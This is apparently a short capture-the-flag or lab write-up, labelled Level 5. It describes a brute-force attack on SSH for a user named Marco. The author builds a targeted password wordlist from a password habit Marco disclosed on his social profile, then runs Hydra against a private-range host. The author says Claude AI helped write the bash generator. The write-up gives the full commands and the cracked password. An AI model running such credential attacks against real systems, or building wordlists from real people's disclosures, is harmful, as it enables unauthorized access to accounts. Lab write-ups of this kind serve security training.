**Level 5 — SSH brute force using Marco's revealed password pattern**
- Found Marco's self-disclosed password tip on his social profile: "I take a company keyword, capitalise it, then append the year and an exclamation mark."
- Used Claude AI to build a targeted SSH wordlist combining the company keywords from Level 2 with year and suffix variants:
```
cat > keywords.txt << 'EOF'
innovation
excellence
security
digital
cloud
future
talent
EOF

> ssh_wordlist.txt
while read w; do
  cap="${w^}"
  for year in 2020 2021 2022 2023 2024 2025 2026 1 12 123 99; do
    echo "${cap}${year}!" >> ssh_wordlist.txt
  done
done < keywords.txt

sort -u ssh_wordlist.txt -o ssh_wordlist.txt
```
- Ran Hydra against the SSH service:
```
hydra -l marco -P ssh_wordlist.txt ssh://10.48.166.147 -t 4 -V
```
- Cracked SSH password: Security2024!

